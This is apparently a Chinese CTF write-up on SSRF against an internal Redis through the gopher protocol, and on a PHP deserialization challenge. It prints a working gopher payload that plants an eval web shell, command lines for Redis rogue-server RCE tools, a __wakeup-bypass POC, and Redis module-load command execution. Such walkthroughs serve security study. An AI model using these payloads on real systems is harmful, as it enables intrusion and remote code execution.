<h2 id="gopher协议攻击内网redis"><a href="#gopher协议攻击内网redis" class="headerlink" title="gopher协议攻击内网redis"></a>gopher协议攻击内网redis</h2><h3 id="ctfshow-web360"><a href="#ctfshow-web360" class="headerlink" title="ctfshow web360"></a>ctfshow web360</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://gitcode.com/tarunkant/Gopherus/overview?utm_source=csdn_github_accelerator&isLogin=1">项目概览 - Gopherus - GitCode</a></p>
<p>url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6379</p>
<p>发现响应时间很长</p>
<p><img src="https://s2.loli.net/2024/04/01/RFIux93lpXymNeo.png">  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>

<p>后边的url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>

<p>发包504 </p>
<p><img src="https://s2.loli.net/2024/04/01/NRHbu58ftJQPimq.png"></p>
<p>证明写入</p>
<p>蚁剑连接即可</p>
<h1 id="Redis主从复制-RCE"><a href="#Redis主从复制-RCE" class="headerlink" title="Redis主从复制 RCE"></a>Redis主从复制 RCE</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>getshell python脚本</p>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rogue-server.py --rhost 172.19.0.2 --lhost 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 172.19.0.2  -L 127.0.0.1 -f exp.so</span><br></pre></td></tr></table></figure>

<p>可以用来绕过disable_function</p>
<h2 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc 如下</p>
<p>类的名字可以通过大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class a&#123;</span><br><span class="line">	public $code = &#x27;eval($_POST[1]);&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class b&#123;</span><br><span class="line">	public $a;</span><br><span class="line">&#125;</span><br><span class="line">$b = new B();</span><br><span class="line">$b-&gt;a = new A();</span><br><span class="line">echo serialize($b);</span><br></pre></td></tr></table></figure>

<p>wakeup 可以修改属性的数量来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?poc=O:1:%22b%22:2:&#123;s:1:%22a%22;O:1:%22a%22:1:&#123;s:4:%22code%22;s:16:%22eval($_POST[1]);%22;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发现无法命令执行，disable_function禁用所有命令执行的函数</p>
<p>查看 config.php.swp 发现redis 数据库密码 you_cannot_guess_it</p>
<p>进行蚁剑redis数据管理插件 连接 随意打开一个数据库， 进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">蚁剑Redis插件地址： https://github.com/Medicean/AS_Redis</span><br></pre></td></tr></table></figure>

<p>先在有权限的目录上传一个exp.so文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件地址：https://github.com/Dliv3/redis-rogue-server</span><br></pre></td></tr></table></figure>

<p>redis 命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br><span class="line">system.exec &quot;ls&quot;</span><br></pre></td></tr></table></figure>







<p><a href="https://ilikeoyt.github.io/2023/06/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/">redis未授权 | ycx’s blog (ilikeoyt.github.io)</a></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">(<em>´∇｀</em>) 欢迎回来！ (cnblogs.com)</a></p>
]]></content>
  </entry>
</search>
